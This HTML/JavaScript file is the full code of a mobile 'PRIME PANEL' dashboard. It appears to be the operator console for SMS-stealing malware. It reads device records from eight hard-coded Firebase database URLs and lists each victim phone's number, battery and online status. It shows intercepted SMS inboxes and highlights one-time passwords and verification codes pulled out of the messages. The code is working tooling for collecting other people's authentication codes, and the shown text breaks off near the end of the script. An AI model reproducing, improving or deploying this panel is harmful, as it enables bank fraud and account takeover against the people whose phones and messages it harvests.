<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>PRIME PANEL · Unified</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
    </script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
    </script>
    <style>
        /* ── RESET & BASE ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0b0f1a;
            --bg-card: #131b2e;
            --bg-card-hover: #1a243c;
            --border-subtle: rgba(64, 128, 255, 0.08);
            --border-active: rgba(64, 128, 255, 0.25);
            --text-primary: #e8edf5;
            --text-secondary: #8a9bb5;
            --text-muted: #4a5a75;
            --accent: #4a9eff;
            --accent-glow: rgba(74, 158, 255, 0.15);
            --online: #2ecc71;
            --offline: #5a6a7a;
            --battery-good: #2ecc71;
            --battery-mid: #f1c40f;
            --battery-low: #e74c3c;
            --radius: 14px;
            --radius-sm: 10px;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
        }

        html {
            font-size: 16px;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            padding: 12px 12px 80px 12px;
            overflow-x: hidden;
        }

        ::-webkit-scrollbar {
            width: 3px;
            height: 3px;
        }
        ::-webkit-scrollbar-track {
            background: transparent;
        }
        ::-webkit-scrollbar-thumb {
            background: var(--text-muted);
            border-radius: 10px;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
        }

        /* ── HEADER ── */
        .header {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius);
            padding: 16px 18px;
            margin-bottom: 16px;
            box-shadow: var(--shadow);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
        }

        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }

        .header-title {
            font-size: 1.25rem;
            font-weight: 700;
            background: linear-gradient(135deg, #4a9eff, #7c5cfc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.3px;
        }

        .header-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.6rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: var(--online);
            background: rgba(46, 204, 113, 0.12);
            padding: 4px 12px;
            border-radius: 40px;
            border: 1px solid rgba(46, 204, 113, 0.15);
        }

        .header-badge .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--online);
            animation: pulse-dot 1.8s ease-in-out infinite;
        }

        @keyframes pulse-dot {
            0%,
            100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.4;
                transform: scale(0.8);
            }
        }

        .header-stats {
            display: flex;
            gap: 20px;
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid var(--border-subtle);
        }

        .stat-item {
            display: flex;
            flex-direction: column;
        }

        .stat-item .number {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--text-primary);
            line-height: 1.2;
        }

        .stat-item .number.online {
            color: var(--online);
        }

        .stat-item .label {
            font-size: 0.55rem;
            text-transform: uppercase;
            letter-spacing: 0.6px;
            color: var(--text-muted);
        }

        .stat-item .label .highlight {
            color: var(--text-secondary);
        }

        /* ── SOURCE SELECTOR ── */
        .source-selector {
            display: flex;
            gap: 6px;
            overflow-x: auto;
            padding: 4px 0 12px 0;
            scrollbar-width: none;
            -webkit-overflow-scrolling: touch;
        }

        .source-selector::-webkit-scrollbar {
            display: none;
        }

        .source-btn {
            flex-shrink: 0;
            padding: 6px 14px;
            border-radius: 40px;
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            color: var(--text-secondary);
            font-size: 0.65rem;
            font-weight: 600;
            letter-spacing: 0.3px;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            text-transform: lowercase;
        }

        .source-btn.active {
            background: var(--accent);
            color: #fff;
            border-color: var(--accent);
            box-shadow: 0 0 20px var(--accent-glow);
        }

        .source-btn:active {
            transform: scale(0.96);
        }

        /* ── SEARCH & FILTER ── */
        .toolbar {
            display: flex;
            gap: 8px;
            margin-bottom: 14px;
            flex-wrap: wrap;
        }

        .search-wrap {
            flex: 1;
            min-width: 140px;
            position: relative;
        }

        .search-wrap input {
            width: 100%;
            padding: 10px 14px 10px 36px;
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-size: 0.8rem;
            outline: none;
            transition: border 0.2s;
        }

        .search-wrap input::placeholder {
            color: var(--text-muted);
        }

        .search-wrap input:focus {
            border-color: var(--accent);
        }

        .search-wrap .icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            font-size: 0.8rem;
            pointer-events: none;
        }

        .filter-group {
            display: flex;
            gap: 4px;
            background: var(--bg-card);
            border-radius: var(--radius-sm);
            padding: 3px;
            border: 1px solid var(--border-subtle);
        }

        .filter-group button {
            padding: 6px 14px;
            border-radius: 8px;
            border: none;
            background: transparent;
            color: var(--text-secondary);
            font-size: 0.65rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .filter-group button.active {
            background: var(--accent);
            color: #fff;
            box-shadow: 0 0 16px var(--accent-glow);
        }

        .filter-group button:active {
            transform: scale(0.94);
        }

        /* ── DEVICE GRID ── */
        .device-grid {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .device-card {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-sm);
            padding: 12px 14px;
            transition: all 0.2s;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            animation: fadeSlide 0.25s ease;
        }

        .device-card:active {
            transform: scale(0.98);
        }

        .device-card .row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
        }

        .device-card .id {
            font-family: 'SF Mono', 'Menlo', monospace;
            font-size: 0.6rem;
            color: var(--text-muted);
            letter-spacing: 0.2px;
            word-break: break-all;
        }

        .device-card .phone {
            font-size: 0.85rem;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .device-card .phone .copy-btn {
            font-size: 0.65rem;
            color: var(--text-muted);
            background: rgba(255, 255, 255, 0.04);
            padding: 2px 8px;
            border-radius: 20px;
            cursor: pointer;
            transition: background 0.2s;
            border: none;
            color: var(--text-secondary);
        }

        .device-card .phone .copy-btn:active {
            background: rgba(255, 255, 255, 0.1);
        }

        .device-card .badges {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .badge-status {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 0.55rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            padding: 2px 10px 2px 6px;
            border-radius: 40px;
        }

        .badge-status.online {
            background: rgba(46, 204, 113, 0.12);
            color: var(--online);
        }

        .badge-status.offline {
            background: rgba(90, 106, 122, 0.15);
            color: var(--offline);
        }

        .badge-status .dot {
            width: 5px;
            height: 5px;
            border-radius: 50%;
            display: inline-block;
        }

        .badge-status.online .dot {
            background: var(--online);
        }
        .badge-status.offline .dot {
            background: var(--offline);
        }

        .badge-battery {
            font-size: 0.65rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 3px;
        }

        .badge-battery .level {
            width: 28px;
            height: 8px;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 6px;
            overflow: hidden;
            position: relative;
        }

        .badge-battery .level .fill {
            height: 100%;
            border-radius: 6px;
            transition: width 0.3s;
        }

        .badge-battery .level .fill.good {
            background: var(--battery-good);
        }
        .badge-battery .level .fill.mid {
            background: var(--battery-mid);
        }
        .badge-battery .level .fill.low {
            background: var(--battery-low);
        }

        .device-card .sms-preview {
            margin-top: 6px;
            font-size: 0.7rem;
            color: var(--text-muted);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            padding-top: 6px;
            border-top: 1px solid var(--border-subtle);
        }

        .device-card .sms-preview .sender {
            color: var(--accent);
            font-weight: 500;
        }

        .device-card .source-tag {
            font-size: 0.5rem;
            color: var(--text-muted);
            background: rgba(255, 255, 255, 0.04);
            padding: 2px 8px;
            border-radius: 20px;
            text-transform: lowercase;
            letter-spacing: 0.3px;
        }

        /* ── INBOX PANEL (slide-up) ── */
        .inbox-panel {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: var(--bg-primary);
            border-top: 1px solid var(--border-subtle);
            border-radius: var(--radius) var(--radius) 0 0;
            padding: 16px 16px 20px 16px;
            max-height: 70vh;
            transform: translateY(100%);
            transition: transform 0.35s cubic-bezier(0.32, 0.72, 0, 1);
            box-shadow: 0 -12px 48px rgba(0, 0, 0, 0.6);
            z-index: 100;
            overflow-y: auto;
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
        }

        .inbox-panel.open {
            transform: translateY(0);
        }

        .inbox-panel .handle {
            width: 40px;
            height: 4px;
            background: var(--text-muted);
            border-radius: 4px;
            margin: 0 auto 12px auto;
            opacity: 0.4;
        }

        .inbox-panel .inbox-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .inbox-panel .inbox-header h3 {
            font-size: 0.9rem;
            font-weight: 600;
        }

        .inbox-panel .inbox-header .close-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 1.2rem;
            cursor: pointer;
            padding: 4px 8px;
        }

        .inbox-panel .inbox-device-info {
            font-size: 0.7rem;
            color: var(--text-secondary);
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-subtle);
        }

        .inbox-panel .inbox-device-info strong {
            color: var(--text-primary);
        }

        .inbox-message {
            background: var(--bg-card);
            border-radius: var(--radius-sm);
            padding: 10px 12px;
            margin-bottom: 6px;
            border-left: 2px solid var(--accent);
            animation: fadeSlide 0.2s ease;
        }

        .inbox-message .msg-sender {
            font-size: 0.6rem;
            font-weight: 600;
            color: var(--accent);
        }

        .inbox-message .msg-time {
            font-size: 0.5rem;
            color: var(--text-muted);
            float: right;
        }

        .inbox-message .msg-body {
            font-size: 0.75rem;
            color: var(--text-primary);
            margin-top: 4px;
            word-break: break-word;
            line-height: 1.4;
        }

        .inbox-message .msg-body .otp {
            color: #f39c12;
            font-weight: 700;
            font-size: 0.85rem;
        }

        .inbox-empty {
            text-align: center;
            color: var(--text-muted);
            font-size: 0.8rem;
            padding: 28px 0;
        }

        /* ── FAB (Floating Action Button) ── */
        .fab {
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: var(--accent);
            border: none;
            color: #fff;
            font-size: 1.6rem;
            box-shadow: 0 8px 28px rgba(74, 158, 255, 0.35);
            cursor: pointer;
            transition: all 0.2s;
            z-index: 50;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .fab:active {
            transform: scale(0.92);
        }

        .fab .badge {
            position: absolute;
            top: -4px;
            right: -4px;
            background: #e74c3c;
            color: #fff;
            font-size: 0.55rem;
            font-weight: 700;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* ── ANIMATIONS ── */
        @keyframes fadeSlide {
            from {
                opacity: 0;
                transform: translateY(6px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ── LOADING PLACEHOLDER ── */
        .loading-placeholder {
            text-align: center;
            padding: 40px 0;
            color: var(--text-muted);
            font-size: 0.8rem;
        }

        .loading-placeholder .spinner {
            width: 28px;
            height: 28px;
            border: 3px solid var(--border-subtle);
            border-top-color: var(--accent);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px auto;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .no-results {
            text-align: center;
            padding: 30px 0;
            color: var(--text-muted);
            font-size: 0.8rem;
        }

        /* ── RESPONSIVE TWEAKS ── */
        @media (max-width: 420px) {
            .header-title {
                font-size: 1rem;
            }
            .stat-item .number {
                font-size: 1.1rem;
            }
            .device-card .phone {
                font-size: 0.75rem;
            }
            .filter-group button {
                padding: 4px 10px;
                font-size: 0.55rem;
            }
            .search-wrap input {
                font-size: 0.7rem;
                padding: 8px 10px 8px 30px;
            }
            .search-wrap .icon {
                font-size: 0.7rem;
                left: 10px;
            }
            .source-btn {
                font-size: 0.55rem;
                padding: 4px 10px;
            }
        }

        @media (min-width: 600px) {
            body {
                padding: 20px 30px 100px 30px;
            }
            .container {
                max-width: 720px;
            }
            .device-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 10px;
            }
            .inbox-panel {
                max-width: 480px;
                left: 50%;
                transform: translateX(-50%) translateY(100%);
                border-radius: var(--radius);
            }
            .inbox-panel.open {
                transform: translateX(-50%) translateY(0);
            }
        }

        @media (min-width: 900px) {
            .container {
                max-width: 960px;
            }
            .device-grid {
                grid-template-columns: 1fr 1fr 1fr;
            }
            .inbox-panel {
                max-width: 560px;
            }
        }
    </style>
</head>
<body>

    <div class="container" id="app">
        <!-- HEADER -->
        <header class="header">
            <div class="header-top">
                <span class="header-title">📡 PRIME PANEL</span>
                <span class="header-badge">
                    <span class="dot"></span> LIVE
                </span>
            </div>
            <div class="header-stats">
                <div class="stat-item">
                    <span class="number online" id="onlineCount">0</span>
                    <span class="label">Online</span>
                </div>
                <div class="stat-item">
                    <span class="number" id="totalCount">0</span>
                    <span class="label">Total <span class="highlight">Devices</span></span>
                </div>
                <div class="stat-item">
                    <span class="number" id="smsCount">0</span>
                    <span class="label">SMS <span class="highlight">Logs</span></span>
                </div>
            </div>
        </header>

        <!-- SOURCE SELECTOR -->
        <div class="source-selector" id="sourceSelector">
            <!-- populated by JS -->
        </div>

        <!-- TOOLBAR -->
        <div class="toolbar">
            <div class="search-wrap">
                <span class="icon">🔍</span>
                <input type="text" id="searchInput" placeholder="Search ID or phone..." inputmode="search">
            </div>
            <div class="filter-group">
                <button class="active" data-filter="all">All</button>
                <button data-filter="online">Online</button>
            </div>
        </div>

        <!-- DEVICE GRID -->
        <div class="device-grid" id="deviceGrid">
            <div class="loading-placeholder">
                <div class="spinner"></div>
                <span>Loading devices…</span>
            </div>
        </div>
    </div>

    <!-- INBOX PANEL (slide-up) -->
    <div class="inbox-panel" id="inboxPanel">
        <div class="handle"></div>
        <div class="inbox-header">
            <h3>📨 Inbox</h3>
            <button class="close-btn" id="closeInboxBtn">✕</button>
        </div>
        <div class="inbox-device-info" id="inboxDeviceInfo">
            <strong>Device</strong> · <span id="inboxPhone">—</span> · 🔋 <span id="inboxBattery">—</span>
        </div>
        <div id="inboxMessagesContainer">
            <div class="inbox-empty">Select a device to view messages</div>
        </div>
    </div>

    <!-- FAB -->
    <button class="fab" id="fabBtn" aria-label="Open Inbox">
        💬
        <span class="badge" id="fabBadge" style="display:none;">0</span>
    </button>

    <script>
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 1. CONFIG — ALL DATABASE URLs (8 sources)
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        const SOURCES = [
            // --- PRIMARY SOURCE (your original) ---
            { id: 'sssssmmmmsw', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app/' },
            // --- OTHER SOURCES ---
            { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/' },
            { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/' },
            { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/' },
            { id: 'strboii', url: 'https://strboii-default-rtdb.firebaseio.com/' },
            { id: 'kalui', url: 'https://kalui-a8e2b-default-rtdb.firebaseio.com/' },
            { id: 'babayou', url: 'https://babayou-ca160-default-rtdb.firebaseio.com/' },
            { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/' },
        ];

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 2. STATE
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        let allDevices = {}; // key: compositeId, value: device object
        let deviceList = []; // array of { id, source, data }
        let selectedSource = 'all'; // 'all' or source id
        let filterMode = 'all'; // 'all' or 'online'
        let searchQuery = '';
        let selectedDeviceId = null; // composite id

        // Firebase app instances cache
        const apps = {};

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 3. HELPERS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function getCompositeId(sourceId, deviceId) {
            return `${sourceId}::${deviceId}`;
        }

        function getPhoneNumber(device) {
            if (!device) return null;
            // Try common fields
            if (device.mobNo) return device.mobNo;
            if (device.mobile) return device.mobile;
            if (device.phone) return device.phone;
            if (device.phoneNumber) return device.phoneNumber;
            // Sometimes inside sims array
            if (device.sims && Array.isArray(device.sims)) {
                for (const sim of device.sims) {
                    if (sim.phoneNumber) return sim.phoneNumber;
                }
            }
            return null;
        }

        function getBattery(device) {
            if (!device) return null;
            let val = device.battery;
            if (val !== undefined && val !== null) {
                if (typeof val === 'string') {
                    const num = parseInt(val, 10);
                    if (!isNaN(num)) return num;
                }
                if (typeof val === 'number') return val;
            }
            return null;
        }

        function getStatus(device) {
            if (!device) return false;
            // status can be boolean, or 'true'/'false' string
            if (device.status === true || device.status === 'true') return true;
            if (device.status === false || device.status === 'false') return false;
            // Also check if there's a ping with wake
            if (device.ping && device.ping.wake === true) return true;
            return false;
        }

        function getLatestMessage(device) {
            if (!device) return null;
            // Check sms_logs
            if (device.sms_logs) {
                const keys = Object.keys(device.sms_logs);
                if (keys.length > 0) {
                    let latest = null;
                    let latestTs = 0;
                    for (const k of keys) {
                        const item = device.sms_logs[k];
                        const ts = item.timestamp || 0;
                        if (ts > latestTs) {
                            latestTs = ts;
                            latest = item;
                        }
                    }
                    return latest;
                }
            }
            // Check for command/message fields
            if (device.message) return { message: device.message, sender: 'command' };
            if (device.sms) return { message: device.sms, sender: 'command' };
            if (device.text) return { message: device.text, sender: 'command' };
            return null;
        }

        function getAllMessages(device) {
            const msgs = [];
            if (!device) return msgs;
            if (device.sms_logs) {
                for (const key in device.sms_logs) {
                    const item = device.sms_logs[key];
                    msgs.push({
                        id: key,
                        sender: item.sender || 'Unknown',
                        message: item.message || '',
                        timestamp: item.timestamp || Date.now()
                    });
                }
            }
            // Also add command messages if present
            if (device.message) {
                msgs.push({ id: 'cmd1', sender: 'command', message: device.message, timestamp: Date.now() });
            }
            if (device.sms) {
                msgs.push({ id: 'cmd2', sender: 'command', message: device.sms, timestamp: Date.now() });
            }
            if (device.text) {
                msgs.push({ id: 'cmd3', sender: 'command', message: device.text, timestamp: Date.now() });
            }
            // Sort by timestamp descending
            msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
            return msgs;
        }

        function getSourceName(sourceId) {
            const found = SOURCES.find(s => s.id === sourceId);
            return found ? found.id : sourceId;
        }

        function getSourceDisplay(sourceId) {
            const map = {
                'sssssmmmmsw': 'prime',
                'neha': 'neha',
                'rajkumar': 'raj',
                'romini': 'rom',
                'strboii': 'str',
                'kalui': 'kalu',
                'babayou': 'baba',
                'annu': 'annu'
            };
            return map[sourceId] || sourceId.substring(0, 4);
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 4. FIREBASE HELPERS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function initFirebaseApp(source) {
            if (apps[source.id]) return apps[source.id];
            try {
                const app = firebase.initializeApp({
                    databaseURL: source.url
                }, source.id);
                apps[source.id] = app;
                return app;
            } catch (e) {
                console.warn('Failed to init app for', source.id, e);
                return null;
            }
        }

        function fetchSourceData(source) {
            return new Promise((resolve) => {
                const app = initFirebaseApp(source);
                if (!app) return resolve({ source, data: null, error: 'init failed' });

                const db = firebase.database(app);
                // For primary source, data is under /users, for others under /clients
                const path = source.id === 'sssssmmmmsw' ? 'users' : 'clients';
                const ref = db.ref(path);

                ref.once('value', (snapshot) => {
                    const val = snapshot.val();
                    resolve({ source, data: val, error: null });
                }, (err) => {
                    console.error('Error fetching', source.id, err);
                    resolve({ source, data: null, error: err.message });
                });
            });
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 5. LOAD ALL SOURCES
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        async function loadAllSources() {
            const grid = document.getElementById('deviceGrid');
            grid.innerHTML = `
                <div class="loading-placeholder">
                    <div class="spinner"></div>
                    <span>Loading ${SOURCES.length} databases…</span>
                </div>
            `;

            const promises = SOURCES.map(s => fetchSourceData(s));
            const results = await Promise.all(promises);

            // Build device list
            const newDevices = {};
            const newList = [];

            for (const result of results) {
                if (!result.data) continue;
                const sourceId = result.source.id;
                const data = result.data;

                for (const deviceId in data) {
                    const deviceData = data[deviceId];
                    const compositeId = getCompositeId(sourceId, deviceId);
                    const enriched = {
                        ...deviceData,
                        _source: sourceId,
                        _deviceId: deviceId,
                        _compositeId: compositeId,
                    };
                    newDevices[compositeId] = enriched;
                    newList.push({
                        id: compositeId,
                        source: sourceId,
                        data: enriched,
                    });
                }
            }

            allDevices = newDevices;
            deviceList = newList;

            // Populate source selector
            renderSourceSelector();
            // Render devices
            applyFiltersAndRender();
            // Update stats
            updateStats();
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 6. RENDER SOURCE SELECTOR
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function renderSourceSelector() {
            const container = document.getElementById('sourceSelector');
            const sources = SOURCES;
            // Count devices per source
            const counts = {};
            for (const item of deviceList) {
                counts[item.source] = (counts[item.source] || 0) + 1;
            }

            let html = `<button class="source-btn active" data-source="all">📡 all (${deviceList.length})</button>`;
            for (const s of sources) {
                const count = counts[s.id] || 0;
                const display = getSourceDisplay(s.id);
                html += `<button class="source-btn" data-source="${s.id}">${display} (${count})</button>`;
            }
            container.innerHTML = html;

            // Attach click events
            container.querySelectorAll('.source-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    container.querySelectorAll('.source-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    selectedSource = btn.dataset.source;
                    applyFiltersAndRender();
                });
            });
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 7. FILTER & RENDER
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function applyFiltersAndRender() {
            let filtered = [...deviceList];

            // Source filter
            if (selectedSource !== 'all') {
                filtered = filtered.filter(item => item.source === selectedSource);
            }

            // Online filter
            if (filterMode === 'online') {
                filtered = filtered.filter(item => getStatus(item.data) === true);
            }

            // Search
            if (searchQuery.trim()) {
                const q = searchQuery.trim().toLowerCase();
                filtered = filtered.filter(item => {
                    const phone = getPhoneNumber(item.data) || '';
                    const id = item.id.toLowerCase();
                    return id.includes(q) || phone.toLowerCase().includes(q);
                });
            }

            renderDevices(filtered);
            updateStats();
        }

        function renderDevices(list) {
            const grid = document.getElementById('deviceGrid');

            if (list.length === 0) {
                grid.innerHTML = `<div class="no-results">No devices found</div>`;
                return;
            }

            let html = '';
            for (const item of list) {
                const data = item.data;
                const phone = getPhoneNumber(data) || '—';
                const battery = getBattery(data);
                const status = getStatus(data);
                const latest = getLatestMessage(data);
                const sourceDisplay = getSourceDisplay(item.source);

                let batteryHtml = '';
                if (battery !== null && battery !== undefined) {
                    let cls = 'good';
                    if (battery < 30) cls = 'low';
                    else if (battery < 55) cls = 'mid';
                    batteryHtml = `
                        <span class="badge-battery">
                            🔋 ${battery}%
                            <span class="level"><span class="fill ${cls}" style="width:${Math.min(battery,100)}%;"></span></span>
                        </span>
                    `;
                } else {
                    batteryHtml = `<span class="badge-battery">🔋 —</span>`;
                }

                const statusHtml = `
                    <span class="badge-status ${status ? 'online' : 'offline'}">
                        <span class="dot"></span> ${status ? 'online' : 'offline'}
                    </span>
                `;

                let previewHtml = '';
                if (latest && latest.message) {
                    const sender = latest.sender || 'Unknown';
                    const msg = latest.message.length > 60 ? latest.message.substring(0, 60) + '…' : latest.message;
                    previewHtml = `
                        <div class="sms-preview">
                            <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
                        </div>
                    `;
                }

                const phoneDisplay = phone && phone !== '—' ? phone : 'no number';

                html += `
                    <div class="device-card" data-composite="${item.id}" onclick="openInbox('${item.id}')">
                        <div class="row">
                            <div>
                                <div class="id">${escapeHtml(item.id.substring(0, 18))}…</div>
                                <div class="phone">
                                    ${escapeHtml(phoneDisplay)}
                                    ${phone && phone !== '—' ? `<button class="copy-btn" onclick="event.stopPropagation(); copyPhone('${escapeHtml(phone)}')">📋</button>` : ''}
                                </div>
                            </div>
                            <div class="badges">
                                ${statusHtml}
                                ${batteryHtml}
                                <span class="source-tag">${sourceDisplay}</span>
                            </div>
                        </div>
                        ${previewHtml}
                    </div>
                `;
            }

            grid.innerHTML = html;
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 8. INBOX PANEL — FIXED to open correctly
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function openInbox(compositeId) {
            // Prevent opening if no device is selected or if the id is invalid
            if (!compositeId || !allDevices[compositeId]) {
                showToast('Device not found');
                return;
            }

            selectedDeviceId = compositeId;
            const device = allDevices[compositeId];

            const panel = document.getElementById('inboxPanel');
            const container = document.getElementById('inboxMessagesContainer');
            const info = document.getElementById('inboxDeviceInfo');
            const phoneEl = document.getElementById('inboxPhone');
            const batteryEl = document.getElementById('inboxBattery');

            const phone = getPhoneNumber(device) || '—';
            const battery = getBattery(device);
            phoneEl.textContent = phone;
            batteryEl.textContent = battery !== null && battery !== undefined ? `${battery}%` : '—';

            const sourceName = getSourceName(device._source);
            info.innerHTML = `<strong>${escapeHtml(device._deviceId?.substring(0, 12) || '')}…</strong> · ${sourceName}`;

            const messages = getAllMessages(device);
            if (messages.length === 0) {
                container.innerHTML = `<div class="inbox-empty">📭 No messages for this device</div>`;
            } else {
                let html = '';
                for (const msg of messages) {
                    const isOTP = /otp|code|verification|password/i.test(msg.message || '');
                    let body = escapeHtml(msg.message || '');
                    if (isOTP) {
                        const match = (msg.message || '').match(/\b\d{4,6}\b/);
                        if (match) {
                            body = body.replace(match[0], `<span class="otp">${match[0]}</span>`);
                        }
                    }
                    html += `
                        <div class="inbox-message">
                            <div>
                                <span class="msg-sender">${escapeHtml(msg.sender || 'Unknown')}</span>
                                <span class="msg-time">${formatTime(msg.timestamp)}</span>
                            </div>
                            <div class="msg-body">${body}</div>
                        </div>
                    `;
                }
                container.innerHTML = html;
            }

            // Open panel
            panel.classList.add('open');
            document.getElementById('fabBadge').style.display = 'none';
        }

        function closeInbox() {
            document.getElementById('inboxPanel').classList.remove('open');
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 9. UTILITIES
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function formatTime(ts) {
            if (!ts) return 'N/A';
            const d = new Date(ts);
            if (isNaN(d.getTime())) return 'N/A';
            return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });
        }

        function copyPhone(phone) {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(phone).then(() => {
                    showToast('📋 Copied: ' + phone);
                }).catch(() => {
                    fallbackCopy(phone);
                });
            } else {
                fallbackCopy(phone);
            }
        }

        function fallbackCopy(text) {
            const input = document.createElement('input');
            input.value = text;
            document.body.appendChild(input);
            input.select();
            document.execCommand('copy');
            document.body.removeChild(input);
            showToast('📋 Copied: ' + text);
        }

        let toastTimer = null;

        function showToast(msg) {
            let toast = document.getElementById('toast');
            if (!toast) {
                toast = document.createElement('div');
                toast.id = 'toast';
                toast.style.cssText = `
                        position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%);
                        background: var(--bg-card); color: var(--text-primary);
                        padding: 10px 20px; border-radius: var(--radius-sm);
                        border: 1px solid var(--border-subtle);
                        font-size: 0.75rem; z-index: 200;
                        box-shadow: var(--shadow);
                        transition: opacity 0.3s;
                        opacity: 0;
                        pointer-events: none;
                        max-width: 90%;
                        text-align: center;
                    `;
                document.body.appendChild(toast);
            }
            toast.textContent = msg;
            toast.style.opacity = '1';
            clearTimeout(toastTimer);
            toastTimer = setTimeout(() => {
                toast.style.opacity = '0';
            }, 2200);
        }

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // 10. STATS
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        function updateStats() {
            const total = deviceList.length;
            let online = 0;
            let totalSms = 0;

            for (const item of deviceList) {
                if (getStatus(item.data)) online++;
                const msgs = getAllMessages(item.data);
                totalSms += msgs.length;
            }

            document.getElementById('onlineCount').textContent = online;
            document.getElementById('totalCount').textContent = total;
            document.getElementById('smsCount').textContent = totalSms;

            // Update FAB badge
            const badge = document.getElementById('fabBadge');
            if (totalSms > 0) {
                badge.textContent = totalSms > 99 ? '99+' : totalSms;
                badge.style.display = 'flex';
            } else {
                badge.style.display = 'none';
            }
        }

